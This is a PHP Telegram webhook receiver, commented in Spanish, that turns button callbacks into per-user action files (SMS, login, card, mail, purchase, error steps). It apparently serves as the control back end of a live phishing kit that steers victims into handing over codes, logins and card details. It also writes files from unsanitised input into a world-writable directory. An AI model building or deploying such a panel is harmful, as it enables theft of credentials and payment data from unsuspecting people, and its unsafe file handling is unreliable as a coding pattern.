<?php
// ===== bot.php — Webhook receiver de Telegram =====
include("settings.php");

$update = json_decode(file_get_contents("php://input"), true);

if (isset($update['callback_query'])) {
    $cb_id   = $update['callback_query']['id'];
    $data    = $update['callback_query']['data']; // Ej: "SMS|usuario123"

    if (strpos($data, '|') !== false) {
        list($comando, $usuario) = explode('|', $data, 2);

        if (!file_exists("acciones")) mkdir("acciones", 0777, true);

        $archivo = "acciones/$usuario.txt";

        $map = [
            'SMS'        => '/SMS',
            'SMSERROR'   => '/SMSERROR',
            'NUMERO'     => '/NUMERO',
            'ERROR'      => '/ERROR',
            'LOGIN'      => '/LOGIN',
            'LOGINERROR' => '/LOGINERROR',
            'CARD'       => '/CARD',
            'LISTO'      => '/LISTO',
            'MAIL'       => '/MAIL',
            'COMPRA'     => '/COMPRA',
        ];
        $accion = $map[$comando] ?? '/ERROR';
        file_put_contents($archivo, $accion);

        // Log para depuración
        error_log("Callback recibido: comando=$comando, usuario=$usuario, accion=$accion, archivo=$archivo");

        tg_request('answerCallbackQuery', [
            'callback_query_id' => $cb_id,
            'text'              => "✅ $comando → $usuario",
            'show_alert'        => false,
        ]);
    }
}

http_response_code(200);
echo 'OK';
